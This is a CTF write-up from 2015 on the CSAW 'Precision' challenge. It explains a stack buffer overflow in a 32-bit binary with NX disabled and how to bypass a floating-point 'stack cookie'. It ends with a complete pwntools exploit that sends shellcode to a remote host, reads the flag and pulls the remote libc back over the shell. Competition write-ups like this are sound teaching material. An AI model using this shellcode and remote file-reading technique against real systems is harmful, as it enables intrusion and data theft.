---
author: breadchris
comments: true
layout: post
date:       2015-09-28 12:00+00:00
slug: csaw-ctf-precision
title:      CSAW CTF 2015 - Precision
---

### TL; DR
* Overflow

Precision was the lowest point exploitation challenge because it was literally a buffer overflow :3

Let's start by getting an idea what is up with it:

```bash
vagrant@precise64:~/csawctf$ file precision
prec: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf2c69f92c3f6d68319ee39c0926e84bccdeb0371, not stripped
```

Alright, and the security mitigations it has:

```bash
vagrant@precise64:~/csawctf$ ~/Template/checksec.sh --file precision
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precfound      NX enabled    No PIE          No RPATH   No RUNPATH   contacts
```

Oh boy! No NX! So we can put shellcode into our payload :3

```nasm
804856f:       lea    eax,[esp+0x18]
8048573:       mov    DWORD PTR [esp+0x4],eax     ; Our input
8048577:       mov    DWORD PTR [esp],0x8048682   ; Scanf format string
804857e:       call   8048410 <__isoc99_scanf@plt>
```

Oh man, we have a `scanf` that prompts us for our input and stores it in a static buffer.

If we look at the function prologue, we get an idea how big this buffer is:

```nasm
8048523:       sub    esp,0xa0 ; Our return address will be around 0xa0 bytes
```

The interesting part of this challenge comes from this part of `main`:

```nasm
8048583:       fld    QWORD PTR [esp+0x98]
804858a:       fld    QWORD PTR ds:0x8048690
8048590:       fucomip st,st(1)
8048592:       fstp   st(0)
8048594:       jp     80485a9 <main+0x8c>
8048596:       fld    QWORD PTR [esp+0x98]
804859d:       fld    QWORD PTR ds:0x8048690
80485a3:       fucomip st,st(1)
80485a5:       fstp   st(0)
80485a7:       je     80485c1 <main+0xa4>
```

We see a lot of floating point operations and at the beginning of that code we see a floating point load from `0x8048690`. Looking at the beginning of this function we see the same address again:

```nasm
8048529:       fld    QWORD PTR ds:0x8048690
804852f:       fstp   QWORD PTR [esp+0x98]
```

and it is storing the value in a stack based variable meaning it is most likely using this floating point value as a "stack cookie" more or less. So by simply getting the bytes of this floating point value and sticking them into our payload at the right offset as to align them with where the floating point value is located, we pass this check and get our exploit to land :3

Oh yeah, they also give us the address of our buffer in memory, so it is super easy peasy :3

### Note
This script also includes an example of how to exfiltrate a libc in case you need it for a higher point problem :3

```python
from pwn import *

r = remote("54.173.98.115", 1259)


shellcode = "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87"

buf = int(r.recvline().strip()[-8:], 16)

r.sendline("A"*(0x80 - len(shellcode)) + shellcode + "\xA5\x31\x5A\x47\x55\x15\x50\x40EEEECCCCDDDD" + p32(buf+8))
r.recv()

r.sendline("cat flag.txt")
print r.recv()

r.sendline("cat /lib32/libc.so.6")

x = ""
while r.can_recv(5):
    x += r.recv()

with open("libc", "wb") as f:
    f.write(x)
```
